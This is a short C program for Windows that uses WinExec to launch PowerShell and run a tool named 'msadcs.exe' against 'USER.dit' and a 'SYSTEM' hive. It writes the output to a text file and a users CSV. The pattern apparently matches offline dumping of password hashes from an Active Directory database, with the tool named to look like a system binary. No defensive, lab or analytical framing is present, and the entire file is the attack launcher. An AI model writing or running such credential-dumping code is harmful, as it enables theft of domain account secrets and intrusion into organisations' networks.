#include <windows.h>

#define RUN(toRun) WinExec("powershell -Command \"& { " toRun " }\"", SW_SHOW);

int main() {
    RUN("msadcs.exe \"USER.dit\" -s \"SYSTEM\" -p a.txt --users-csv a.csv");
    return 0;
}